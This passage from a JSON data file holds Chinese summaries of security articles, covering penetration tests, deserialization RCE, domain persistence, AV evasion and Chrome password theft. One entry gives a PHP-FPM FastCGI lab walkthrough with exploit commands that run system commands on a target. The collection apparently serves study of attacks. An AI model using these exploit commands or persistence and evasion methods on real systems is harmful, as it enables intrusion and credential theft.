        "page_content": "文档介绍了 hyorm，一个自研的 Java ORM 框架，它使用“约定大于配置”的设计思想，提供了简单的查询、更新、删除和插入操作。框架支持各种查询条件，包括等值、in、like、not、not in、大于/小于和排序。它还提供了基于简单对象的模式，允许用户使用直观的 Java 对象编程方式编写结构化单表 SQL。",
        "FileName": "12587-hyorm，一款自研java orm框架的使用方法.pdf"
    },
    {
        "page_content": "该文档记录了一次对某系统的渗透测试，测试人员通过目录扫描和分析 JavaScript 代码，发现了未授权的接口，从而获取了普通用户和管理员的用户名和密码。测试人员还发现全站用户的默认密码为 123456，并成功登录了管理员账户。",
        "FileName": "11451-记对某系统的一次测试.pdf"
    },
    {
        "page_content": "该文档介绍了 CC5、CC6 和 CC7 测试环境中利用 Java 反序列化漏洞进行远程代码执行的 POC，其中涉及了 ChainedTransformer、LazyMap、TiedMapEntry 等类，通过分析这些类的readObject()方法和相关方法的调用关系，可以构造恶意payload，在反序列化时触发命令执行。",
        "FileName": "9874-CC链学习-中.pdf"
    },
    {
        "page_content": "该文档总结了域内维持技术的常见方法，包括万能密码、LSA 绕过、SSP 持久化、黄金票据、白银票据、AdminSDHolder 滥用、SID History 后门和 DSRM 后门。这些技术允许攻击者在域环境中建立持久性，即使域控制器被重新启动或密码被更改。",
        "FileName": "11048-域内持久化总结.pdf"
    },
    {
        "page_content": "本文探讨了套接字 (socket) 的概念和实现，重点介绍了 TCP 套接字的阻塞模式和粘包问题。它还提供了使用 C++ 实现套接字的示例代码，包括服务器和客户端的实现。",
        "FileName": "10462-socket详解与实现.pdf"
    },
    {
        "page_content": "本文讨论了更新密码爆破字典的方法，作者从多个平台收集了泄露的密码数据，并提取了各种类型的密码，包括键盘组合、拼音、数字与字母混合等。作者提供了提取这些密码类型的算法和脚本，并分享了生成的字典，供读者下载使用。",
        "FileName": "7823-是时候更新一下密码爆破字典了.pdf"
    },
    {
        "page_content": "本文档探讨了子域枚举技术，该技术旨在通过增加发现漏洞的概率来提高渗透测试的成功率。它介绍了各种工具和技术，包括搜索引擎、第三方服务、专用工具和证书透明度，以帮助安全研究人员和渗透测试人员识别和枚举目标域的子域。",
        "FileName": "7286-从子域枚举到漏洞发现.pdf"
    },
    {
        "page_content": "该文档详细描述了对某棋牌站进行渗透测试的过程，包括利用 ThinkPHP 漏洞进行 SQL 注入、枚举数据库账户和密码、绕过限制上传 ASPX webshell、上线 CS 并执行命令、查看系统信息和开启远程桌面连接等步骤，最终成功获取了该站点的控制权。",
        "FileName": "9164-对某棋牌站的一次getshell.pdf"
    },
    {
        "page_content": "本文探讨了利用 DNS 缓存和 TLS 协议将受限 SSRF 攻击转变为通用 SSRF 攻击的新方法。该方法利用 DNS 重绑定技术和 TLS 会话重用优化算法的缺陷，绕过常见的 SSRF 防御措施，从而实现对内部网络和应用程序的攻击。",
        "FileName": "8351-利用DNS缓存和TLS协议将受限SSRF变为通用SSRF.pdf"
    },
    {
        "page_content": "该文档详细描述了作者利用 SQL 注入漏洞在某大学网站上获取 shell 权限的过程。作者通过绕过过滤机制，使用 SQLmap 工具和 FreeBSD 操作系统特性，成功遍历目录并找到网站根目录。随后，作者尝试写入 shell 但失败，但发现可以读取服务器上的任意敏感文件。通过泄露的数据库信息，作者尝试登录网站后台但失败，最终通过解密 hash 值和修改 antSword 流量加密方式成功登录。作者还尝试反弹 shell 但失败，并最终未能提权。",
        "FileName": "10527-记一次某大学sql注入到getshell.pdf"
    },
    {
        "page_content": "该文档分析了 Weblogic T3 协议反序列化漏洞 CVE-2015-4852，该漏洞允许攻击者通过发送恶意序列化数据来执行任意代码。文档详细介绍了 T3 协议的工作原理、攻击原理、Weblogic 环境的搭建、T3 协议攻击示例、反序列化源码分析以及 CVE-2015-4852 补丁的分析和绕过。",
        "FileName": "10563-WeblogicT3反序列化浅析之cve-2015-4852.pdf"
    },
    {
        "page_content": "本文档介绍了 Windows 操作系统的提权技术，包括内核提权、数据库提权、应用程序提权和中间人劫持等方法。它强调了收集系统信息的重要性，并提供了用于查询系统信息、查看服务 PID 号、查看补丁信息和查看当前安装程序的命令。此外，本文档还介绍了 Pr 提权、WinSystemHelper、Sherlock 和 Privesc 等提权工具，并提供了它们的用法和示例。",
        "FileName": "8091-提权学习之旅——Windows操作系统提权.pdf"
    },
    {
        "page_content": "该文档详细介绍了作者在渗透测试中遇到的 SQL 注入漏洞，以及如何绕过前端参数加密和 JS 加密混淆来成功注入。作者通过分析加密算法、编写 Python 脚本和调用 JavaScript 加密函数，最终实现了盲注，获取了数据库信息和用户表数据，证明了即使前端参数加密，SQL 注入仍然可以通过其他方式实现。",
        "FileName": "8071-一次sm4参数加密下的sql盲注.pdf"
    },
    {
        "page_content": "该文档描述了如何利用 Druid 未授权访问和任意文件上传漏洞，通过爆破 Session 和绕过黑名单限制，成功上传 Webshell。该漏洞利用了 Druid 监控文件上传接口的特性，以及 Windows 对文件扩展名的特殊处理，最终获得了对目标系统的控制权。",
        "FileName": "10110-从druid未授权到getshell.pdf"
    },
    {
        "page_content": "本文档详细描述了作者通过分析登录页面、找回密码功能和移动端接口，成功挖掘出任意账户密码重置漏洞的过程。作者通过修改响应包、分析接口响应和扫描 APK，最终找到了管理员 ID 并重置了普通用户密码，验证了漏洞的存在。",
        "FileName": "11757-记一次简单的src挖掘.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 APC（异步过程调用）机制向多线程进程注入 DLL。它详细描述了实现原理、所需函数和代码示例，并提供了使用该方法注入 DLL 的步骤。",
        "FileName": "11572-APC进程注入.pdf"
    },
    {
        "page_content": "该文档分析了 Jackson-databind-2670 远程代码执行漏洞，该漏洞绕过了 Jackson-databind 的黑名单类。它影响使用 openjpa-all 库且 JDK 版本较低的项目。漏洞利用 JNDI 注入，通过调用 org.apache.openjpa.ee.WASRegistryManagedRuntime 类的 getTransactionManager 方法，该方法使用可控的 _registryName 变量作为参数。通过启用 DefaultTyping，攻击者可以在反序列化时指定要还原的类，从而执行代码。官方的缓解措施是将 org.apache.openjpa.ee.WASRegistryManagedRuntime 添加到黑名单，但这种方法治标不治本，因为攻击者可以找到其他绕过黑名单的途径。防御措施包括升级 Jackson-databind 到安全版本和升级到更高版本的 JDK。",
        "FileName": "7506-Jackson-databind-2670远程代码执行漏洞简单分析.pdf"
    },
    {
        "page_content": "该文档介绍了利用 scrapy-redis 反序列化漏洞进行攻击的方法，该漏洞允许攻击者通过将恶意对象序列化并存储在 Redis 中，然后由 scrapy 获取并反序列化，从而在目标系统上执行任意命令。文档详细介绍了漏洞的原理、利用步骤以及如何配置环境和修改代码以利用该漏洞。",
        "FileName": "8434-从bytectf学到的scrapy-redis反序列化漏洞.pdf"
    },
    {
        "page_content": "该文档讨论了在负载均衡环境下连接到 WebShell 的问题，并提出了一个通过实现 HTTP 代理来解决该问题的解决方案。该代理将所有对 WebShell 的连接请求代理到指定的节点上处理，从而绕过负载均衡的限制。",
        "FileName": "10297-负载均衡踩坑记.pdf"
    },
    {
        "page_content": "本文探讨了物联网固件逆向工程的基础知识，重点介绍了从固件文件中提取文件、分析文件系统和模拟固件以发现漏洞的步骤。通过使用工具和技术，如binwalk、qemu-user-static和BuildRoot，研究人员可以深入了解固件的内部工作原理，识别潜在的弱点，并测试软件而无需购买实际设备。",
        "FileName": "12320-物联网固件逆向工程基础.pdf"
    },
    {
        "page_content": "Apache Dubbo 是高性能的 Java RPC 框架，其默认通信协议为 dubbo 协议。Dubbo 协议支持 HTTP 协议进行通信，但存在反序列化漏洞，可导致远程代码执行。此外，Dubbo 协议还存在 hessian 反序列化漏洞，可导致任意代码执行。",
        "FileName": "10916-Java安全-Dubbo.pdf"
    },
    {
        "page_content": "该文档探讨了从 C 源代码到 ELF 可执行文件的生成过程，重点介绍了二进制基础、程序编译和链接、以及 x86 和 amd64 汇编简述。它涵盖了 ELF 段、局部和全局变量、函数和跨文件引用等概念，并提供了汇编指令的详细解释，包括数据传送、累加器专用、有效地址送寄存器、标志寄存器传送、加法、减法、乘法、除法、逻辑、移位和循环指令。",
        "FileName": "12644-PWN入门之二进制基础.pdf"
    },
    {
        "page_content": "该文档记录了对先知社区网站 JavaScript 反爬虫机制的逆向分析过程。该机制涉及三个主要步骤：数组还原、数组解密和 cookie 生成。通过对 JavaScript 代码的分析，作者还原了乱序数组，并使用 rc4 解密算法解密数组内容。最后，使用 unsbox() 和 hexXor() 函数生成 arg2 并将其写入 cookie 中。",
        "FileName": "12238-一次简单的先知社区js逆向记录.pdf"
    },
    {
        "page_content": "该文档分析了 DedeCMS v5.7 SP2 后台模板注入漏洞，该漏洞允许攻击者通过在模板中插入恶意代码来实现 RCE 和 GetShell。文档详细介绍了漏洞的分析过程，包括模板解析、函数调用和代码执行的流程，并提供了利用该漏洞的具体步骤和示例 payload。",
        "FileName": "8056-DedeCMS v5.7 SP2后台SSTI到RCE再到GetShell.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Python 中的并发编程，包括多线程、多进程和多协程，并讨论了它们的优缺点和适用场景。文档还介绍了线程池和进程池的概念，以及如何使用它们来管理并发任务。",
        "FileName": "12766-python并发从0到1.pdf"
    },
    {
        "page_content": "Apache Ofbiz RCE (CVE-2020-9496) 漏洞分析文档详细介绍了该漏洞的利用方式，包括路由机制、反序列化利用链和漏洞复现步骤。该漏洞允许攻击者通过向 /webtools/control/xmlrpc 发送精心构造的 XML 请求，在目标系统上执行任意代码。",
        "FileName": "8184-Apache Ofbiz RCE (CVE-2020-9496) 漏洞分析.pdf"
    },
    {
        "page_content": "该文档主要讨论了 Microsoft Office Excel 中的 XXE 漏洞，该漏洞允许攻击者通过解析 XML 文件来读取任意文件。文档概述了漏洞的发现、利用方法以及在不同 Java 版本和操作系统上的测试结果。此外，文档还提供了相关案例和参考资料，以帮助读者进一步了解 XXE 漏洞。",
        "FileName": "7747-记一次excel XXE漏洞.pdf"
    },
    {
        "page_content": "该文档分析了 Oracle WebLogic Server 中的 CVE-2022-21350 漏洞，该漏洞允许未经身份验证的攻击者通过 T3 访问网络来破坏服务器，导致数据访问、更新、删除或部分拒绝服务。",
        "FileName": "10918-CVE-2022-21350 WebLogic T3 RCE 简单分析.pdf"
    },
    {
        "page_content": "该文档重点介绍了 Java Bean Validation 中的远程代码执行 (RCE) 漏洞，该漏洞允许攻击者通过注入 EL 表达式来执行任意代码。该漏洞源于错误消息中回显了用户可控的 Java Bean 属性，这些属性被连接到 Bean Validation 的错误信息中，从而导致 EL 表达式被执行并插入到违规信息中。",
        "FileName": "10693-Java安全-深入BeanValidation的RCE漏洞.pdf"
    },
    {
        "page_content": "XSS（跨站脚本攻击）是一种常见的网络安全漏洞，攻击者通常会在网页中插入恶意的 JavaScript 代码。由于服务器对输入数据的过滤和验证不严格，这些恶意的 JavaScript 代码会被当作响应的一部分返回给客户端。当浏览器解析来自服务器的响应时，它会执行这些恶意的 JavaScript 代码，从而导致攻击者能够执行恶意操作。本文分析了 XSS 原理、解析过程、攻击场景、攻击位置，并提供了针对不同类型 XSS 攻击的防御措施和绕过方法。",
        "FileName": "12890-XSS原理分析与绕过总结.pdf"
    },
    {
        "page_content": "本文档详细介绍了对 BeeCMS 代码进行审计的过程，发现了包括 SQL 注入、后台登录绕过、任意文件删除、任意文件读取等多个漏洞。这些漏洞的成因主要在于输入过滤不严、变量覆盖、文件包含等安全问题。通过分析代码和抓取数据包，作者成功利用这些漏洞，并提供了相应的攻击方法和利用技巧。",
        "FileName": "11955-beescms代码审计学习.pdf"
    },
    {
        "page_content": "**文档主题：** Fastcgi  协议分析与  PHP-FPM  攻击⽅法\n\n**文档内容：**\n\nFastcgi  协议是⼀种让交互程序与 Web 服务器中间件进⾏数据交换的协议。 Fastcgi  协议由多个  Record  组成， Record  也有  Header  和  Body  ⼀说，服务器中间件将这⼆者按照  Fastcgi  的规则封装好发送给语⾔后端，语⾔后端解码以后拿到   \t contentLength \t   再在请求的  TCP  流⾥读取⼤⼩等于   \t contentLength \t   的数据，这 就是  Body  体。\n\n后端语⾔解析了  Fastcgi  头以后，拿到   \t contentLength \t   的值指向的 Body 按照对应的结构解析成  key-value  对，这就是环境变量。环境变量的作⽤不仅是填充   \t $_SERVER \t   数组的⼀部分，也是告诉  fpm ： “ 我要执⾏哪个  PHP  ⽂件 ” 。 PHP-FPM  默认监听的端⼝是  9000  端⼝。\n\nPHP-FPM  未授权访问漏洞差不多也就呼之欲出了。攻击者可以通过   \t PHP_VALUE \t   和   \t PHP_ADMIN_VALUE \t   这两个环境变量设置  PHP  配置项   \t auto_prepend_file \t 和   \t allow_url_include \t   ，从⽽使  PHP-FPM  执⾏我们提供的任意代码，造成任意代码执⾏。除此之外，由于  PHP-FPM  和  Web 服务器中间件是通过⽹络进⾏沟通的，因此⽬前越来越多的集群将  PHP-FPM  直接绑定在公⽹上，所有⼈都可以对其进⾏访问。这样就意味着，任何⼈都可以伪装成 Web 服务器中间件来让  PHP-FPM  执⾏我们想执⾏的恶意代码。这就造成了  PHP-FPM  的未授 权访问漏洞。\n\n下⾯我们搭建环境，对  PHP-FPM  未授权访问漏洞的攻击过程进⾏讲解。\n\n靶   机： Ubuntu （ 192.168.0.175 ） 攻击机： Kali （ 192.168.0.128 ） 这⾥直接在 Ubuntu 上安装 Nginx 和 php-fpm ，⾸先安装 Nginx sudo\tapt-get\tinstall\tnginx 安装 php 、 php-fpm 以及⼀些插件 sudo\tapt-get\tinstall\tsoftware-properties-common\tpython-software-properties\t sudo\tadd-apt-repository\tppa:ondrej/php\t\t\t\t #\t 这⾥容易卡死 ,\t 解决⽅法是挂代理 sudo\tapt-get\tupdate sudo\tapt-get\t-y\tinstall\tphp7.4 sudo\tapt-get\t-y\tinstall\tphp7.4-fpm\tphp7.4-mysql\tphp7.4-curl\tphp7.4-json\tphp7.4-mbstring\tphp7.4-xml \t\t php7.4-intl 接下来我们需要修改  PHP-FPM  的配置，设置监听 9000 端⼝来处理 nginx 的请求，并将  PHP-FPM  暴露在  0.0.0.0  上⾯。 打开   \t /etc/php/7.4/fpm/pool.d/www.conf \t   ⽂件找到如下位置，注释掉第⼀⾏并添加第⼆⾏： PHP-FPM  未授权访问漏洞 环境搭建 配置  PHP-FPM;listen\t=\t/run/php/php7.4-fpm.sock listen\t=\t0.0.0.0:9000 此时将  PHP-FPM  的监听地址设置为了   \t 0.0.0.0:9000 \t ，便会产⽣ PHP-FPM  未授权访问漏洞，此时攻击者可以直接与暴露在⽬ 标主机  9000  端⼝上的  PHP-FPM  进⾏通信，进⽽可以实现任意代码执⾏。 下⾯修改权限 chmod\t 777 \t/run/php/php7.4-fpm.sock 打开 nginx 的配置⽂件   \t /etc/nginx/sites-available/default \t   修改相应部分的配置 server\t{ \t\t\t\tlisten\t\t\t\t\t\t\t80;\t# 监听 80 端⼝，接收 http 请求 \t\t\t\tserver_name\t\twww.example.com;\t# 就是⽹站地址 \t\t\t\troot\t/var/www/html;\t#\t 准备存放代码⼯程的路径 \t\t\t\t# 路由到 ⽹站根⽬录 www.example.com 时候的处理 \t\t\t\tlocation\t/\t{ \t\t\t\t\t\t\t\tindex\tindex.php;\t# 跳转到 www.example.com/index.php \t\t\t\t\t\t\t\tautoindex\ton; \t\t\t\t}\t\t \t\t\t\t# 当请求⽹站下 php ⽂件的时候，反向代理到 php-fpm \t\t\t\tlocation\t~\t\\.php$\t{ \t\t\t\t\t\t\t\tfastcgi_split_path_info\t^(.+\\.php)(/.+)$; \t\t\t\t\t\t\t\tfastcgi_pass\t0.0.0.0:9000;#nginx\tfastcgi 进程监听的 IP 地址和端⼝ \t\t\t\t\t\t\t\t#fastcgi_pass\tunix:/run/php/php7.4-fpm.sock;\n10.\t\t\t\t\t\t\t\tfastcgi_index\tindex.php; \t\t\t\t\t\t\t\tinclude\tfastcgi_params; \t\t\t\t} } 配置完成后查看⼀下 php-fpm 的安装位置，然后启动 whereis\tphp-fpm /usr/sbin/php-fpm7.4\t\t\t\t #\t 这是我的靶机上 php-fpm 安装的位置 重新启动 Nginx sudo\tsystemctl\trestart\tnginx 然后检查 nginx 是否正确启动   \t systemctl\tstatus\tnginx \t ： 启动环境检查 php-fpm 是否正确启动   \t ps\t-elf\t|\tgrep\tphp-fpm \t 这⾥就可以看出上⾯所说的存在⼀个 master 进程和多个 worker 进程。 下⾯将   \t /var/www/html \t   ⽬录下的⽂件删除，新建⼀个 index.php ，内容可以写上   \t <?php\tphpinfo();\t?> \t   ⽤来检查各项是否正 常运⾏（如果⻚⾯为空，查看这篇 ⽂章 解决）： 其中  Sever API  处和上图⼀样说明运⾏正确。下⾯我们开始攻击。项⽬地址： https://github.com/wofeiwo/webcgi-exploits 将该项⽬下载下来后，进⼊到  webcgi-exploits/php/Fastcgi  ⽬录中： 然后安装  go  环境进⾏编译： go\tbuild\tfcgi_exp.go\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t #\t 编译 fcgi_exp.go 然后直接运⾏可以看到  fcgi_exp  的使⽤⽅法： 使⽤如下命令进⾏测试 ./fcgi_exp\tsystem\t 192 .168.43.82\t 9000 \t/var/www/html/index.php\t \"id\" system ：要使⽤的 PHP 函数 192.168.43.82 ：⽬标机 IP 9000 ：⽬标机  fpm  端⼝ /var/www/html/index.php ：已知的位于⽬标机上的 PHP ⽂件 id ：要执⾏的系统命令 如下图所示，成功执⾏系统命令，利⽤成功： 利⽤  fcgi_exp  攻击项⽬地址： https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 “ 兼容 Python2 和 Python3 ，⽅便在内⽹⽤。之前好些⼈总是拿着⼀个 GO 写的⼯具在⽤，⼜不太好⽤。实 际上理解了 fastcgi 协议，再看看这个源码，就很简单了。 “ ​  —— phith0n 利⽤⽅式： python\tfpm.py\t 192 .168.43.82\t/var/www/html/index.php\t-c\t \"<?php\tsystem('id');\texit();\t?>\" 如下图所示，成功执⾏系统命令，利⽤成功： 利⽤  phith0n  ⼤神的  fpm.py有时候  PHP-FPM  也并不会执⾏绑定在  0.0.0.0  上⾯，⽽是  127.0.0.1 ，这样便避免了将  PHP-FPM  暴露在公⽹上被攻击者访问， 但是如果⽬标主机上存在  SSRF  漏洞的话，我们便可以通过  SSRF  漏洞攻击内⽹的  PHP-FPM  。 靶   机： Ubuntu （ 192.168.0.175 ） 攻击机： Kali （ 192.168.0.128 ） 在⽬标机 Web ⽬录中新建  ssrf.php  ⽂件，写⼊以下存在  SSRF  漏洞的代码： <?php \t\t\t\t highlight_file ( __FILE__ ); \t\t\t\t $url \t = \t $_GET [",
        "FileName": "9544-Fastcgi 协议分析与 PHP-FPM 攻击方法.pdf"
    },
    {
        "page_content": "该文档讲述了一个网络安全分析师通过各种技术手段，包括情报查询、代码分析和社交工程，追踪攻击者的艰难过程。尽管分析师成功收集了攻击者的个人信息，但最终未能获得其单位信息，这凸显了网络溯源的挑战性。",
        "FileName": "9582-记一次艰难的溯源故事（对不起学长）.pdf"
    },
    {
        "page_content": "该文档探讨了利用 Dubbo 客户端反序列化漏洞进行远程代码执行 (RCE) 的新方法。通过注册恶意服务到注册中心并控制客户端的序列化类型，攻击者可以发送恶意序列化数据，从而在客户端上触发 RCE。这种攻击方式比直接攻击服务端更隐蔽，因为攻击者可以绕过特定 IP 和端口的限制，并针对注册中心进行攻击。",
        "FileName": "7354-Dubbo反序列化RCE利用之新拓展面 - Dubbo Rouge攻击客户端.pdf"
    },
    {
        "page_content": "该文档介绍了如何在 Windows 操作系统上回显 Java Socket 文件描述符，重点介绍了 BIO 和 NIO 两种回显方法。作者尝试了不同的方法，包括模拟 Linux 上的回显方式，但最终发现 Windows 上的回显会导致服务崩溃。文档还讨论了确定 Windows 下 Socket 文件描述符的挑战，并邀请读者分享他们的想法和解决方案。",
        "FileName": "7566-win描述符下成功又失败的回显.pdf"
    },
    {
        "page_content": "该文档详细描述了作者在渗透测试中利用一个漏洞获取目标服务器的 shell 权限的过程，包括信息收集、部署 shell、提权尝试和最终放弃。文档重点介绍了提权的困难，因为目标服务器是 Amazon 主机，没有 gcc，无法访问外网，并且没有可用的提权漏洞。",
        "FileName": "8605-简单离奇的偷塔行为.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 ThinkPHP 5.0.23 中的 method RCE 漏洞，通过修改 filter 链来执行任意代码。利用链涉及使用 error_reporting 函数将字符串转换为整数，然后使用 think\\Session::set 将数据写入 session，最后使用 think\\Cookie::get 和 think\\__include_file 包含 session 中的恶意文件。该漏洞影响 ThinkPHP 5.0.8 至 5.0.23 版本。",
        "FileName": "11189-TP5 RCE利用链改造.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用 LTER 命令中的限制性字符来触发应用程序崩溃，并利用该崩溃来执行任意代码。它提供了逐步说明，包括生成唯一字符串、确定偏移量、查找允许的字符、找到 JMP ESP 地址和生成 shellcode。通过执行这些步骤，攻击者可以利用该漏洞在目标机器上获得 shell 访问权限。",
        "FileName": "12335-利用限制性的字符对LTER命令进行利用.pdf"
    },
    {
        "page_content": "该文档介绍了一种利用 Java 对象搜索器工具挖掘 Tomcat8 回显链的过程。该工具通过搜索线程中的 Request 对象，并通过反射获取 RequestInfo，最终获取可回显的 Request 对象，从而实现回显。",
        "FileName": "12569-挖掘Tomcat8回显链过程.pdf"
    },
    {
        "page_content": "LFSR（线性反馈移位寄存器）是一种密码学中常见的流密码生成器，它通过反馈函数将寄存器中的值不断移位和反馈，形成循环序列。在 CTF 比赛中，LFSR 题目通常要求根据给定的反馈函数和输出序列反推出初始状态（flag）。解题的关键在于分析反馈函数，将其整理成数学表达式，并利用输出序列逆推初始状态。",
        "FileName": "12663-LSFR入门.pdf"
    },
    {
        "page_content": "本文介绍了一种利用 Inline Hook 技术创建通用 Webshell 的方法，该方法通过修改程序指令来控制程序执行流，绕过现代防护技术。它通过 hook recv 和 WSARecv 函数来拦截网络数据，并在收到特定命令时执行命令并返回输出。该方法跨平台且稳定，可用于在 Windows 上创建通用 Webshell。",
        "FileName": "9774-利用 Hook 技术打造通用的 Webshell.pdf"
    },
    {
        "page_content": "**主题：** 免杀学习 - 从指令绕过开始\n\n**内容：** 本文介绍了如何使用破晓工具和 certutil 指令绕过杀毒软件的检测，实现免杀上线。通过对 certutil 加解密功能的利用，可以将木马文件加密成文本文件，从而躲避查杀。此外，还介绍了文件切割和缝合技术，以及修改文件后缀绕过检测的方法。",
        "FileName": "12759-免杀学习-从指令绕过开始(1).pdf"
    },
    {
        "page_content": "该文档详细介绍了如何通过逆向分析和利用漏洞来渗透一个APP，包括绕过反抓包、寻找突破口、利用Shiro漏洞获取RCE权限、编写Webshell并解决相关问题，最终成功获取目标服务器的控制权。",
        "FileName": "10906-APP简单逆向到getshell.pdf"
    },
    {
        "page_content": "该文档分析了 JNDI 注入的主题和内容，包括 JNDI 的定义、注入原理、通过 RMI 和 LDAP 进行注入的具体方法，以及 Java 在不同版本中对 JNDI 注入的限制和绕过方法。",
        "FileName": "8214-JNDI注入学习.pdf"
    },
    {
        "page_content": "该文档记录了一次实战渗透测试，其中攻击者通过 JMX 控制台漏洞获得了目标服务器的访问权限，并通过 PowerShell 上线。随后，攻击者收集了域信息，包括域控 IP、域管账户、域内用户和主机，并使用 SPN 扫描识别了目标服务器上的服务。攻击者尝试了 PTH 和 MS17010 漏洞，但均未成功，最终通过横向移动和 MS17010 漏洞攻陷了其他主机。",
        "FileName": "9906-记一次实战渗透(上).pdf"
    },
    {
        "page_content": "本文介绍了在微服务架构下收集信息的方法，包括备案查询、证书透明度公开日志枚举、DNS枚举、端⼝扫描、隐私文件探测、API探测和源代码还原。通过这些方法，可以逐步发现和拼凑出微服务架构的整体结构，从而获得更多有价值的信息。",
        "FileName": "7252-新时代的渗透思路！微服务下的信息搜集（II）.pdf"
    },
    {
        "page_content": "该文档介绍了 XYHCMS v3.6 中的一个命令执行漏洞，该漏洞允许攻击者通过在 site.php 中添加恶意代码来获取目标终端的权限。该漏洞存在于 SystemController.class.php 中，攻击者可以通过绕过输入过滤来执行 PHP 代码，从而获得对系统的控制权。",
        "FileName": "7756-xyhcms v3.6 命令执行.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 C++ 实现抓取所有版本 Chrome 存储的密码。它解释了 Chrome 使用 DPAPI 加密密码，并提供了使用 SQLite3 和 Crypto++ 库解密密码的代码示例。该文档还分析了 Chrome 80+ 版本中密码加密算法的变化，并提供了针对新算法的解密方法。",
        "FileName": "9752-c++实现抓取所有版本Chrome存储的密码.pdf"
    },
    {
        "page_content": "该文档介绍了一种在 Windows 环境中创建隐藏用户（影子用户）的方法，通过修改注册表，可以将影子用户的 F 值替换为管理员用户的 F 值，从而获得管理员权限。此外，文档还介绍了关闭远程桌面连接的身份验证和安全层验证，以便在不知道密码的情况下登录远程桌面。",
        "FileName": "9673-后渗透之权限维持 -- 隐藏用户的创建和使用.pdf"
    },
    {
        "page_content": "WordPress Ninja Forms 插件存在一个 CSRF to XSS 漏洞（CVE-2020-12462），攻击者可利用该漏洞将 WordPress 网站中启用的 Ninja Forms 表单替换为包含恶意 JavaScript 的表单，当用户使用这些表单时触发 XSS 漏洞。该漏洞存在于 ninja-forms\\lib\\NF_Upgrade.php 文件的 ninja_forms_ajax_import_form 函数中，该函数在导入表单时未验证 CSRF 令牌，攻击者可构造恶意页面链接诱骗管理员点击，从而向 Ninja Forms 插件提交导入恶意表单的请求。",
        "FileName": "7768-WordPress Ninja Forms插件 CSRF to XSS漏洞（CVE-2020-12462）分析.pdf"
    },
    {
        "page_content": "本篇文档主要介绍了如何分析 Tomcat 漏洞，并通过实例讲解了如何利用内存马深入浅出地学习 Tomcat。文章首先介绍了 Tomcat 的组件结构，然后详细分析了 StandardWrapper、StandardWrapperValve、StandardContext、StandardContextValve、Connector、Processor 等组件的作用，并通过代码示例展示了如何通过反射获取 Context、添加监听器、添加 Filter、添加 Servlet、添加 Valve 等操作。最后，文章还提供了利用内存马注入 Filter 的示例代码，并介绍了如何通过反序列化注入内存马。",
        "FileName": "12705-深入浅出内存马.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 HTTPS 协议构建一个命令与控制 (C&C) 服务器和客户端，该服务器和客户端用于在服务器和受控设备之间进行加密通信。它涵盖了服务器和客户端的架构、路由、数据库设计、代码实现以及如何使用 HTTPS 保护通信。",
        "FileName": "12601-用 https 完成一个 C&C.pdf"
    },
    {
        "page_content": "CVE-2020-23580 漏洞存在于 PbootCMS 的 message board 功能中，该功能未对数据进行有效验证，攻击者可通过该漏洞引发代码远程执行。漏洞源于 MessageController.php 中 str_replace() 函数和 ParserController.php 中 parserIfLabel() 函数的安全检查不足，攻击者可通过构造恶意留言绕过安全检查，并利用 eval() 函数执行任意代码。",
        "FileName": "11251-CVE-2020-23580 PBootCMS安全漏洞浅析.pdf"
    },
    {
        "page_content": "CVE-2012-4792 漏洞是一个释放重引用的漏洞，影响 Microsoft Internet Explorer 6 到 8。该漏洞允许远程代码执行，利用了 mshtml.dll 中释放 CButton 对象后未更新 CDoc 中 Default Element 的问题。攻击者可以通过创建 DOM 流并使用 Math.tan、Math.sin 和 Math.cos 函数来触发漏洞，从而在已释放内存中执行代码。",
        "FileName": "9452-Internet Explorer漏洞分析(五)——CVE-2012-4792.pdf"
    },
    {
        "page_content": "该文档分析了 baijiacms CMS 中的远程代码执行 (RCE) 漏洞，该漏洞源于 includes/baijiacms/common.inc.php 中的 file_save() 函数。攻击者可以通过上传恶意文件来利用此漏洞，该文件包含一个分号 (;) 字符，从而绕过系统命令执行限制并执行任意命令。",
        "FileName": "12167-baijiacms漏洞分析.pdf"
    },
    {
        "page_content": "该文档探讨了 Java 动态代理机制，它允许在运行时创建代理类，从而修改委托类的行为。动态代理通过使用 `InvocationHandler` 接口和 `Proxy` 类来实现，允许在不修改委托类源代码的情况下添加或修改功能。",
        "FileName": "9197-JAVA安全基础（三）-- java动态代理机制.pdf"
    },
    {
        "page_content": "该文档分析了 CobaltStrike 中 Beacon 上线协议，详细介绍了 Beacon DLL 的执行顺序、通信函数、C2Profile 解析、加密过程和 TeamServer 处理 HTTP 请求的过程。它提供了对 Beacon 上线流程和 C2Profile 结构的深入理解，并展示了 TeamServer 如何使用 NanoHTTPD 库处理 HTTP 请求并解密 Beacon 发送的信息。",
        "FileName": "10827-CobaltStrike逆向学习系列(4)：Beacon 上线协议分析.pdf"
    },
    {
        "page_content": "ACAF（Auto Code Audit Framework）是一个基于 ASM 的 Java 自动化代码审计工具，它通过分析字节码来提取漏洞特征，并使用污点分析技术来判断是否存在漏洞。ACAF 允许用户提供漏洞代码示例，并自动提取特征，从而简化了代码审计过程。",
        "FileName": "10756-基于ASM的java自动化代码审计工具 ACAF(Auto Code Audit Framework).pdf"
    },
    {
        "page_content": "该文档分析了 Oracle WebLogic Server 中的 CVE-2020-2551 漏洞，该漏洞允许攻击者通过 IIOP 协议执行远程代码。文档详细介绍了漏洞的原理、利用过程、修复方法以及缓解措施，并提供了调试和测试漏洞的建议。",
        "FileName": "7374-漫谈 WebLogic CVE-2020-2551.pdf"
    },
    {
        "page_content": "该文档分析了 Weblogic-CVE-2020-14756 漏洞，该漏洞利用了 MvelExtractor 类和 TopNAggregator.PartialResult 类之间的交互，绕过了 Weblogic 的黑名单检测，从而允许执行任意 EL 表达式。",
        "FileName": "9550-weblogic-CVE-2020-14756漏洞分析.pdf"
    },
    {
        "page_content": "本文深入分析了 Java 中 JDBC、MyBatis 和 Hibernate 框架下的 SQL 注入漏洞，重点关注了预编译机制在防止注入攻击中的作用。通过代码示例和技术细节，文章阐述了如何利用参数可控和 SQL 语句可拼接的漏洞进行注入，并介绍了预编译如何通过添加引号和转义特殊字符来防御这些攻击。",
        "FileName": "10593-Java SQL注入深入分析.pdf"
    },
    {
